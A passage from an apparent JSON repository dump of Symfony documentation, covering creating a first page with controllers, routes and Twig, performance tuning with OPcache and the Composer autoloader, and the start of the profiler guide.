https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sendberry/README.md\n.. _`Sendinblue`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sendinblue/README.md\n.. _`Seven.io`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sevenio/README.md\n.. _`SimpleTextin`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SimpleTextin/README.md\n.. _`Sinch`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sinch/README.md\n.. _`Slack`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Slack/README.md\n.. _`Sms77`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Sms77/README.md\n.. _`SmsBiuras`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsBiuras/README.md\n.. _`Smsbox`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsbox/README.md\n.. _`Smsapi`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsapi/README.md\n.. _`Smsc`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Smsc/README.md\n.. _`SMSense`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SMSense/README.md\n.. _`SmsSluzba`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SmsSluzba/README.md\n.. _`SpotHit`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/SpotHit/README.md\n.. _`Telegram`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Telegram/README.md\n.. _`Telnyx`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Telnyx/README.md\n.. _`TurboSms`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/TurboSms/README.md\n.. _`Twilio`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Twilio/README.md\n.. _`Twitter`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Twitter/README.md\n.. _`Unifonic`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Unifonic/README.md\n.. _`Vonage`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Vonage/README.md\n.. _`Yunpian`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Yunpian/README.md\n.. _`Zendesk`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Zendesk/README.md\n.. _`Zulip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Notifier/Bridge/Zulip/README.md\n"
        },
        {
          "name": "page_creation.rst",
          "type": "blob",
          "size": 9.646484375,
          "content": ".. _creating-pages-in-symfony2:\n.. _creating-pages-in-symfony:\n\nCreate your First Page in Symfony\n=================================\n\nCreating a new page - whether it's an HTML page or a JSON endpoint - is a\ntwo-step process:\n\n#. **Create a controller**: A controller is the PHP function you write that\n   builds the page. You take the incoming request information and use it to\n   create a Symfony ``Response`` object, which can hold HTML content, a JSON\n   string or even a binary file like an image or PDF;\n\n#. **Create a route**: A route is the URL (e.g. ``/about``) to your page and\n   points to a controller.\n\n.. admonition:: Screencast\n    :class: screencast\n\n    Do you prefer video tutorials? Check out the `Harmonious Development with Symfony`_\n    screencast series.\n\n.. seealso::\n\n    Symfony *embraces* the HTTP Request-Response lifecycle. To find out more,\n    see :doc:`/introduction/http_fundamentals`.\n\nCreating a Page: Route and Controller\n-------------------------------------\n\n.. tip::\n\n    Before continuing, make sure you've read the :doc:`Setup </setup>`\n    article and can access your new Symfony app in the browser.\n\nSuppose you want to create a page - ``/lucky/number`` - that generates a lucky (well,\nrandom) number and prints it. To do that, create a \"Controller\" class and a\n\"controller\" method inside of it::\n\n    <?php\n    // src/Controller/LuckyController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class LuckyController\n    {\n        public function number(): Response\n        {\n            $number = random_int(0, 100);\n\n            return new Response(\n                '<html><body>Lucky number: '.$number.'</body></html>'\n            );\n        }\n    }\n\n.. _annotation-routes:\n.. _attribute-routes:\n\nNow you need to associate this controller function with a public URL (e.g. ``/lucky/number``)\nso that the ``number()`` method is called when a user browses to it. This association\nis defined with the ``#[Route]`` attribute (in PHP, `attributes`_ are used to add\nmetadata to code):\n\n.. code-block:: diff\n\n      // src/Controller/LuckyController.php\n\n      // ...\n    + use Symfony\\Component\\Routing\\Attribute\\Route;\n\n      class LuckyController\n      {\n    +     #[Route('/lucky/number')]\n          public function number(): Response\n          {\n              // this looks exactly the same\n          }\n      }\n\nThat's it! If you are using :doc:`the Symfony web server </setup/symfony_server>`,\ntry it out by going to: http://localhost:8000/lucky/number\n\n.. tip::\n\n    Symfony recommends defining routes as attributes to have the controller code\n    and its route configuration at the same location. However, if you prefer, you can\n    :doc:`define routes in separate files </routing>` using YAML, XML and PHP formats.\n\nIf you see a lucky number being printed back to you, congratulations! But before\nyou run off to play the lottery, check out how this works. Remember the two steps\nto create a page?\n\n#. *Create a controller and a method*: This is a function where *you* build the page and ultimately\n   return a ``Response`` object. You'll learn more about :doc:`controllers </controller>`\n   in their own section, including how to return JSON responses;\n\n#. *Create a route*: In ``config/routes.yaml``, the route defines the URL to your\n   page (``path``) and what ``controller`` to call. You'll learn more about :doc:`routing </routing>`\n   in its own section, including how to make *variable* URLs.\n\nThe bin/console Command\n-----------------------\n\nYour project already has a powerful debugging tool inside: the ``bin/console`` command.\nTry running it:\n\n.. code-block:: terminal\n\n    $ php bin/console\n\nYou should see a list of commands that can give you debugging information, help generate\ncode, generate database migrations and a lot more. As you install more packages,\nyou'll see more commands.\n\nTo get a list of *all* of the routes in your system, use the ``debug:router`` command:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:router\n\nYou should see your ``app_lucky_number`` route in the list:\n\n.. code-block:: terminal\n\n    ----------------  -------  -------  -----  --------------\n    Name              Method   Scheme   Host   Path\n    ----------------  -------  -------  -----  --------------\n    app_lucky_number  ANY      ANY      ANY    /lucky/number\n    ----------------  -------  -------  -----  --------------\n\nYou will also see debugging routes besides ``app_lucky_number`` -- more on\nthe debugging routes in the next section.\n\nYou'll learn about many more commands as you continue!\n\n.. tip::\n\n    If your shell is supported, you can also set up console completion support.\n    This autocompletes commands and other input when using ``bin/console``.\n    See :ref:`the Console document <console-completion-setup>` for more\n    information on how to set up completion.\n\n.. _web-debug-toolbar:\n\nThe Web Debug Toolbar: Debugging Dream\n--------------------------------------\n\nOne of Symfony's *amazing* features is the Web Debug Toolbar: a bar that displays\na *huge* amount of debugging information along the bottom of your page while\ndeveloping. This is all included out of the box using a :ref:`Symfony pack <symfony-packs>`\ncalled ``symfony/profiler-pack``.\n\nYou will see a dark bar along the bottom of the page. You'll learn more about\nall the information it holds along the way, but feel free to experiment: hover\nover and click the different icons to get information about routing,\nperformance, logging and more.\n\nRendering a Template\n--------------------\n\nIf you're returning HTML from your controller, you'll probably want to render\na template. Fortunately, Symfony comes with `Twig`_: a templating language that's\nminimal, powerful and actually quite fun.\n\nInstall the twig package with:\n\n.. code-block:: terminal\n\n    $ composer require twig\n\nMake sure that ``LuckyController`` extends Symfony's base\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController` class:\n\n.. code-block:: diff\n\n      // src/Controller/LuckyController.php\n\n      // ...\n    + use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n\n    - class LuckyController\n    + class LuckyController extends AbstractController\n      {\n          // ...\n      }\n\nNow, use the handy ``render()`` method to render a template. Pass it a ``number``\nvariable so you can use it in Twig::\n\n    // src/Controller/LuckyController.php\n    namespace App\\Controller;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    // ...\n\n    class LuckyController extends AbstractController\n    {\n        #[Route('/lucky/number')]\n        public function number(): Response\n        {\n            $number = random_int(0, 100);\n\n            return $this->render('lucky/number.html.twig', [\n                'number' => $number,\n            ]);\n        }\n    }\n\nTemplate files live in the ``templates/`` directory, which was created for you automatically\nwhen you installed Twig. Create a new ``templates/lucky`` directory with a new\n``number.html.twig`` file inside:\n\n.. code-block:: html+twig\n\n    {# templates/lucky/number.html.twig #}\n    <h1>Your lucky number is {{ number }}</h1>\n\nThe ``{{ number }}`` syntax is used to *print* variables in Twig. Refresh your browser\nto get your *new* lucky number!\n\n    http://localhost:8000/lucky/number\n\nNow you may wonder where the Web Debug Toolbar has gone: that's because there is\nno ``</body>`` tag in the current template. You can add the body element yourself,\nor extend ``base.html.twig``, which contains all default HTML elements.\n\nIn the :doc:`templates </templates>` article, you'll learn all about Twig: how\nto loop, render other templates and leverage its powerful layout inheritance system.\n\nChecking out the Project Structure\n----------------------------------\n\nGreat news! You've already worked inside the most important directories in your\nproject:\n\n``config/``\n    Contains... configuration!. You will configure routes,\n    :doc:`services </service_container>` and packages.\n\n``src/``\n    All your PHP code lives here.\n\n``templates/``\n    All your Twig templates live here.\n\nMost of the time, you'll be working in ``src/``, ``templates/`` or ``config/``.\nAs you keep reading, you'll learn what can be done inside each of these.\n\nSo what about the other directories in the project?\n\n``bin/``\n    The famous ``bin/console`` file lives here (and other, less important\n    executable files).\n\n``var/``\n    This is where automatically-created files are stored, like cache files\n    (``var/cache/``) and logs (``var/log/``).\n\n``vendor/``\n    Third-party (i.e. \"vendor\") libraries live here! These are downloaded via the `Composer`_\n    package manager.\n\n``public/``\n    This is the document root for your project: you put any publicly accessible files\n    here.\n\nAnd when you install new packages, new directories will be created automatically\nwhen needed.\n\nWhat's Next?\n------------\n\nCongrats! You're already starting to master Symfony and learn a whole new\nway of building beautiful, functional, fast and maintainable applications.\n\nOK, time to finish mastering the fundamentals by reading these articles:\n\n* :doc:`/routing`\n* :doc:`/controller`\n* :doc:`/templates`\n* :doc:`/frontend`\n* :doc:`/configuration`\n\nThen, learn about other important topics like the\n:doc:`service container </service_container>`,\nthe :doc:`form system </forms>`, using :doc:`Doctrine </doctrine>`\n(if you need to query a database) and more!\n\nHave fun!\n\nGo Deeper with HTTP & Framework Fundamentals\n--------------------------------------------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    introduction/*\n\n.. _`Twig`: https://twig.symfony.com\n.. _`Composer`: https://getcomposer.org\n.. _`Harmonious Development with Symfony`: https://symfonycasts.com/screencast/symfony/setup\n.. _`attributes`: https://www.php.net/manual/en/language.attributes.overview.php\n"
        },
        {
          "name": "performance.rst",
          "type": "blob",
          "size": 14.5703125,
          "content": "Performance\n===========\n\nSymfony is fast, right out of the box. However, you can make it faster if you\noptimize your servers and your applications as explained in the following\nperformance checklists.\n\nPerformance Checklists\n----------------------\n\nUse these checklists to verify that your application and server are configured\nfor maximum performance:\n\n* **Symfony Application Checklist**:\n\n  #. :ref:`Install APCu Polyfill if your server uses APC <performance-install-apcu-polyfill>`\n  #. :ref:`Restrict the number of locales enabled in the application <performance-enabled-locales>`\n\n* **Production Server Checklist**:\n\n  #. :ref:`Dump the service container into a single file <performance-service-container-single-file>`\n  #. :ref:`Use the OPcache byte code cache <performance-use-opcache>`\n  #. :ref:`Configure OPcache for maximum performance <performance-configure-opcache>`\n  #. :ref:`Don't check PHP files timestamps <performance-dont-check-timestamps>`\n  #. :ref:`Configure the PHP realpath Cache <performance-configure-realpath-cache>`\n  #. :ref:`Optimize Composer Autoloader <performance-optimize-composer-autoloader>`\n\n.. _performance-install-apcu-polyfill:\n\nInstall APCu Polyfill if your Server Uses APC\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your production server still uses the legacy APC PHP extension instead of\nOPcache, install the `APCu Polyfill component`_ in your application to enable\ncompatibility with `APCu PHP functions`_ and unlock support for advanced Symfony\nfeatures, such as the APCu Cache adapter.\n\n.. _performance-enabled-locales:\n\nRestrict the Number of Locales Enabled in the Application\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUse the :ref:`framework.enabled_locales <reference-enabled-locales>`\noption to only generate the translation files actually used in your application.\n\n.. _performance-service-container-single-file:\n\nDump the Service Container into a Single File\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony compiles the :doc:`service container </service_container>` into multiple\nsmall files by default. Set this parameter to ``true`` to compile the entire\ncontainer into a single file, which could improve performance when using\n\"class preloading\" in PHP 7.4 or newer versions:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            # ...\n            .container.dumper.inline_factories: true\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <parameters>\n                <!-- ... -->\n                <parameter key=\".container.dumper.inline_factories\">true</parameter>\n            </parameters>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        return function(ContainerConfigurator $container): void {\n            $container->parameters()->set('.container.dumper.inline_factories', true);\n        };\n\n.. _performance-use-opcache:\n\n.. tip::\n\n    The ``.`` prefix denotes a parameter that is only used during compilation of the container.\n    See :ref:`Configuration Parameters <configuration-parameters>` for more details.\n\nUse the OPcache Byte Code Cache\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOPcache stores the compiled PHP files to avoid having to recompile them for\nevery request. There are some `byte code caches`_ available, but as of PHP\n5.5, PHP comes with `OPcache`_ built-in. For older versions, the most widely\nused byte code cache is APC.\n\n.. _performance-use-preloading:\n\nUse the OPcache class preloading\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nStarting from PHP 7.4, OPcache can compile and load classes at start-up and\nmake them available to all requests until the server is restarted, improving\nperformance significantly.\n\nDuring container compilation (e.g. when running the ``cache:clear`` command),\nSymfony generates a file with the list of classes to preload in the\n``var/cache/`` directory. Rather than use this file directly, use the\n``config/preload.php`` file that is created when\n:doc:`using Symfony Flex in your project </setup/flex>`:\n\n.. code-block:: ini\n\n    ; php.ini\n    opcache.preload=/path/to/project/config/preload.php\n\n    ; required for opcache.preload:\n    opcache.preload_user=www-data\n\nIf this file is missing, run this command to update the Symfony Flex recipe:\n``composer recipes:update symfony/framework-bundle``.\n\nUse the :ref:`container.preload <dic-tags-container-preload>` and\n:ref:`container.no_preload <dic-tags-container-nopreload>` service tags to define\nwhich classes should or should not be preloaded by PHP.\n\n.. _performance-configure-opcache:\n\nConfigure OPcache for Maximum Performance\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe default OPcache configuration is not suited for Symfony applications, so\nit's recommended to change these settings as follows:\n\n.. code-block:: ini\n\n    ; php.ini\n    ; maximum memory that OPcache can use to store compiled PHP files\n    opcache.memory_consumption=256\n\n    ; maximum number of files that can be stored in the cache\n    opcache.max_accelerated_files=20000\n\n.. _performance-dont-check-timestamps:\n\nDon't Check PHP Files Timestamps\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn production servers, PHP files should never change, unless a new application\nversion is deployed. However, by default OPcache checks if cached files have\nchanged their contents since they were cached. This check introduces some\noverhead that can be avoided as follows:\n\n.. code-block:: ini\n\n    ; php.ini\n    opcache.validate_timestamps=0\n\nAfter each deployment, you must empty and regenerate the cache of OPcache. Otherwise\nyou won't see the updates made in the application. Given that in PHP, the CLI\nand the web processes don't share the same OPcache, you cannot clear the web\nserver OPcache by executing some command in your terminal. These are some of the\npossible solutions:\n\n1. Restart the web server;\n2. Call the ``apc_clear_cache()`` or ``opcache_reset()`` functions via the\n   web server (i.e. by having these in a script that you execute over the web);\n3. Use the `cachetool`_ utility to control APC and OPcache from the CLI.\n\n.. _performance-configure-realpath-cache:\n\nConfigure the PHP ``realpath`` Cache\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen a relative path is transformed into its real and absolute path, PHP\ncaches the result to improve performance. Applications that open many PHP files,\nsuch as Symfony projects, should use at least these values:\n\n.. code-block:: ini\n\n    ; php.ini\n    ; maximum memory allocated to store the results\n    realpath_cache_size=4096K\n\n    ; save the results for 10 minutes (600 seconds)\n    realpath_cache_ttl=600\n\n.. note::\n\n    PHP disables the ``realpath`` cache when the `open_basedir`_ config option\n    is enabled.\n\n.. _performance-optimize-composer-autoloader:\n\nOptimize Composer Autoloader\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe class loader used while developing the application is optimized to find new\nand changed classes. In production servers, PHP files should never change,\nunless a new application version is deployed. That's why you can optimize\nComposer's autoloader to scan the entire application once and build an\noptimized \"class map\", which is a big array of the locations of all the classes\nand it's stored in ``vendor/composer/autoload_classmap.php``.\n\nExecute this command to generate the new class map (and make it part of your\ndeployment process too):\n\n.. code-block:: terminal\n\n    $ composer dump-autoload --no-dev --classmap-authoritative\n\n* ``--no-dev`` excludes the classes that are only needed in the development\n  environment (i.e. ``require-dev`` dependencies and ``autoload-dev`` rules);\n* ``--classmap-authoritative`` creates a class map for PSR-0 and PSR-4 compatible classes\n  used in your application and prevents Composer from scanning the file system for\n  classes that are not found in the class map. (see: `Composer's autoloader optimization`_).\n\nDisable Dumping the Container as XML in Debug Mode\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn :ref:`debug mode <debug-mode>`, Symfony generates an XML file with all the\n:doc:`service container </service_container>` information (services, arguments, etc.)\nThis XML file is used by various debugging commands such as ``debug:container``\nand ``debug:autowiring``.\n\nWhen the container grows larger and larger, so does the size of the file and the\ntime to generate it. If the benefit of this XML file does not outweigh the decrease\nin performance, you can stop generating the file as follows:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            # ...\n            debug.container.dump: false\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <parameters>\n                <!-- ... -->\n                <parameter key=\"debug.container.dump\">false</parameter>\n            </parameters>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n\n        // ...\n        $container->parameters()->set('debug.container.dump', false);\n\n.. _profiling-applications:\n\nProfiling Symfony Applications\n------------------------------\n\nProfiling with Blackfire\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n`Blackfire`_ is the best tool to profile and optimize performance of Symfony\napplications during development, test and production. It's a commercial service,\nbut provides a `full-featured demo`_.\n\nProfiling with Symfony Stopwatch\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides a basic performance profiler in the development\n:ref:`config environment <configuration-environments>`. Click on the \"time panel\"\nof the :ref:`web debug toolbar <web-debug-toolbar>` to see how much time Symfony\nspent on tasks such as making database queries and rendering templates.\n\nYou can measure the execution time and memory consumption of your own code and\ndisplay the result in the Symfony profiler thanks to the `Stopwatch component`_.\n\nWhen using :ref:`autowiring <services-autowire>`, type-hint any controller or\nservice argument with the :class:`Symfony\\\\Component\\\\Stopwatch\\\\Stopwatch` class\nand Symfony will inject the ``debug.stopwatch`` service::\n\n    use Symfony\\Component\\Stopwatch\\Stopwatch;\n\n    class DataExporter\n    {\n        public function __construct(\n            private Stopwatch $stopwatch,\n        ) {\n        }\n\n        public function export(): void\n        {\n            // the argument is the name of the \"profiling event\"\n            $this->stopwatch->start('export-data');\n\n            // ...do things to export data...\n\n            // reset the stopwatch to delete all the data measured so far\n            // $this->stopwatch->reset();\n\n            $this->stopwatch->stop('export-data');\n        }\n    }\n\nIf the request calls this service during its execution, you'll see a new\nevent called ``export-data`` in the Symfony profiler.\n\nThe ``start()``, ``stop()`` and ``getEvent()`` methods return a\n:class:`Symfony\\\\Component\\\\Stopwatch\\\\StopwatchEvent` object that provides\ninformation about the current event, even while it's still running. This\nobject can be converted to a string for a quick summary::\n\n    // ...\n    dump((string) $this->stopwatch->getEvent('export-data')); // dumps e.g. '4.50 MiB - 26 ms'\n\nYou can also profile your template code with the :ref:`stopwatch Twig tag <reference-twig-tag-stopwatch>`:\n\n.. code-block:: twig\n\n    {% stopwatch 'render-blog-posts' %}\n        {% for post in blog_posts %}\n            {# ... #}\n        {% endfor %}\n    {% endstopwatch %}\n\nProfiling Categories\n....................\n\nUse the second optional argument of the ``start()`` method to define the\ncategory or tag of the event. This helps keep events organized by type::\n\n    $this->stopwatch->start('export-data', 'export');\n\nProfiling Periods\n.................\n\nA `real-world stopwatch`_ not only includes the start/stop button but also a\n\"lap button\" to measure each partial lap. This is exactly what the ``lap()``\nmethod does, which stops an event and then restarts it immediately::\n\n    $this->stopwatch->start('process-data-records', 'export');\n\n    foreach ($records as $record) {\n        // ... some code goes here\n        $this->stopwatch->lap('process-data-records');\n    }\n\n    $event = $this->stopwatch->stop('process-data-records');\n    // $event->getDuration(), $event->getMemory(), etc.\n\n    // Lap information is stored as \"periods\" within the event:\n    // $event->getPeriods();\n\nProfiling Sections\n..................\n\nSections are a way to split the profile timeline into groups. Example::\n\n    $this->stopwatch->openSection();\n    $this->stopwatch->start('validating-file', 'validation');\n    $this->stopwatch->stopSection('parsing');\n\n    $events = $this->stopwatch->getSectionEvents('parsing');\n\n    // later you can reopen a section passing its name to the openSection() method\n    $this->stopwatch->openSection('parsing');\n    $this->stopwatch->start('processing-file');\n    $this->stopwatch->stopSection('parsing');\n\nAll events that don't belong to any named section are added to the special section\ncalled ``__root__``. This way you can get all stopwatch events, even if you don't\nknow their names, as follows::\n\n    foreach($this->stopwatch->getSectionEvents('__root__') as $event) {\n        echo (string) $event;\n    }\n\nLearn more\n----------\n\n* :doc:`/http_cache/varnish`\n\n.. _`byte code caches`: https://en.wikipedia.org/wiki/List_of_PHP_accelerators\n.. _`OPcache`: https://www.php.net/manual/en/book.opcache.php\n.. _`Composer's autoloader optimization`: https://getcomposer.org/doc/articles/autoloader-optimization.md\n.. _`APCu Polyfill component`: https://github.com/symfony/polyfill-apcu\n.. _`APCu PHP functions`: https://www.php.net/manual/en/ref.apcu.php\n.. _`cachetool`: https://github.com/gordalina/cachetool\n.. _`open_basedir`: https://www.php.net/manual/ini.core.php#ini.open-basedir\n.. _`Blackfire`: https://blackfire.io/docs/introduction?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=performance\n.. _`full-featured demo`: https://demo.blackfire.io?utm_source=symfony&utm_medium=symfonycom_docs&utm_campaign=performance\n.. _`Stopwatch component`: https://symfony.com/components/Stopwatch\n.. _`real-world stopwatch`: https://en.wikipedia.org/wiki/Stopwatch\n"
        },
        {
          "name": "profiler.rst",
          "type": "blob",
          "size": 21.2119140625,
          "content": "Profiler\n========\n\nThe profiler is a powerful **development tool** that gives detailed information\nabout the execution of any request.\n\n.. danger::\n\n    **Never** enable the profiler in production environments\n    as it will lead to major security vulnerabilities in your project.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the ``profiler`` :ref:`Symfony pack <symfony-packs>` before using it:\n\n.. code-block:: terminal\n\n    $ composer require --dev symfony/profiler-pack\n\nNow, browse any page of your application in the development environment to let\nthe profiler collect information. Then, click on any element of the debug\ntoolbar injected at the bottom of your pages to open the web interface of the\nSymfony Profiler, which will look like this:\n\n.. image:: /_images/profiler/web-interface.png\n    :alt: The Symfony Web profiler page.\n    :class: with-browser\n\n.. note::\n\n    The debug toolbar is only injected into HTML responses. For other kinds of\n    contents (e.g. JSON responses in API requests) the profiler URL is available\n    in the ``X-Debug-Token-Link`` HTTP response header. Browse the ``/_profiler``\n    URL to see all profiles.\n\n.. note::\n\n    To limit the storage used by profiles on disk, they are probabilistically\n    removed after 2 days.\n\nAccessing Profiling Data Programmatically\n-----------------------------------------\n\nMost of the time, the profiler information is accessed and analyzed using its\nweb-based interface. However, you can also retrieve profiling information\nprogrammatically thanks to the methods provided by the ``profiler`` service.\n\nWhen the response object is available, use the\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\Profiler\\\\Profiler::loadProfileFromResponse`\nmethod to access to its associated profile::\n\n    // ... $profiler is the 'profiler' service\n    $profile = $profiler->loadProfileFromResponse($response);\n\n.. note::\n\n    The ``profiler`` service will be :doc:`autowired </service_container/autowiring>`\n    automatically when type-hinting any service argument with the\n    :class:`Symfony\\\\Component\\\\HttpKernel\\\\Profiler\\\\Profiler` class.\n\nWhen the profiler stores data about a request, it also associates a token with it;\nthis token is available in the ``X-Debug-Token`` HTTP header of the response.\nUsing this token, you can access the profile of any past response thanks to the\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\Profiler\\\\Profiler::loadProfile` method::\n\n    $token = $response->headers->get('X-Debug-Token');\n    $profile = $profiler->loadProfile($token);\n\n.. tip::\n\n    When the profiler is enabled but not the web debug toolbar, inspect the page\n    with your browser's developer tools to get the value of the ``X-Debug-Token``\n    HTTP header.\n\nThe ``profiler`` service also provides the\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\Profiler\\\\Profiler::find` method to\nlook for tokens based on some criteria::\n\n    // gets the latest 10 tokens\n    $tokens = $profiler->find('', '', 10, '', '', '');\n\n    // gets the latest 10 tokens for all URLs containing /admin/\n    $tokens = $profiler->find('', '/admin/', 10, '', '', '');\n\n    // gets the latest 10 tokens for all URLs not containing /api/\n    $tokens = $profiler->find('', '!/api/', 10, '', '', '');\n\n    // gets the latest 10 tokens for local POST requests\n    $tokens = $profiler->find('127.0.0.1', '', 10, 'POST', '', '');\n\n    // gets the latest 10 tokens for requests that happened between 2 and 4 days ago\n    $tokens = $profiler->find('', '', 10, '', '4 days ago', '2 days ago');\n\nData Collectors\n---------------\n\nThe profiler gets its information using some services called \"data collectors\".\nSymfony comes with several collectors that get information about the request,\nthe logger, the routing, the cache, etc.\n\nRun this command to get the list of collectors actually enabled in your app:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:container --tag=data_collector\n\nYou can also :ref:`create your own data collector <profiler-data-collector>` to\nstore any data generated by your app and display it in the debug toolbar and the\nprofiler web interface.\n\n.. _profiler-timing-execution:\n\nTiming the Execution of the Application\n---------------------------------------\n\nIf you want to measure the time some tasks take in your application, there's no\nneed to create a custom data collector. Instead, use the built-in utilities to\n:ref:`profile Symfony applications <profiling-applications>`.\n\n.. tip::\n\n    Consider using a professional profiler such as `Blackfire`_ to measure and\n    analyze the execution of your application in detail.\n\n.. _enabling-the-profiler-programmatically:\n\nEnabling the Profiler Programmatically or Conditionally\n-------------------------------------------------------\n\nSymfony Profiler can be enabled and disabled programmatically. You can use the ``enable()``\nand ``disable()`` methods of the :class:`Symfony\\\\Component\\\\HttpKernel\\\\Profiler\\\\Profiler`\nclass in your controllers to manage the profiler programmatically::\n\n    use Symfony\\Component\\HttpKernel\\Profiler\\Profiler;\n    // ...\n\n    class DefaultController\n    {\n        // ...\n\n        public function someMethod(?Profiler $profiler): Response\n        {\n            // $profiler won't be set if your environment doesn't have the profiler (like prod, by default)\n            if (null !== $profiler) {\n                // if it exists, disable the profiler for this particular controller action\n                $profiler->disable();\n            }\n\n            // ...\n        }\n    }\n\nIn order for the profiler to be injected into your controller you need to\ncreate an alias pointing to the existing ``profiler`` service:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services_dev.yaml\n        services:\n            Symfony\\Component\\HttpKernel\\Profiler\\Profiler: '@profiler'\n\n    .. code-block:: xml\n\n        <!-- config/services_dev.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"Symfony\\Component\\HttpKernel\\Profiler\\Profiler\" alias=\"profiler\"/>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services_dev.php\n        use Symfony\\Component\\HttpKernel\\Profiler\\Profiler;\n\n        $container->setAlias(Profiler::class, 'profiler');\n\n.. _enabling-the-profiler-conditionally:\n\nEnabling the Profiler Conditionally\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of enabling the profiler programmatically as explained in the previous\nsection, you can also enable it when a certain condition is met (e.g. a certain\nparameter is included in the URL):\n\n.. code-block:: yaml\n\n    # config/packages/dev/web_profiler.yaml\n        framework:\n            profiler:\n                collect: false\n                collect_parameter: 'profile'\n\nThis configuration disables the profiler by default (``collect: false``) to\nimprove the application performance; but enables it for requests that include a\nquery parameter called ``profile`` (you can freely choose this query parameter name).\n\nIn addition to the query parameter, this feature also works when submitting a\nform field with that name (useful to enable the profiler in ``POST`` requests)\nor when including it as a request attribute.\n\nUpdating the Web Debug Toolbar After AJAX Requests\n--------------------------------------------------\n\n`Single-page applications`_ (SPA) are web applications that interact with the\nuser by dynamically rewriting the current page rather than loading entire new\npages from a server.\n\nBy default, the debug toolbar displays the information of the initial page load\nand doesn't 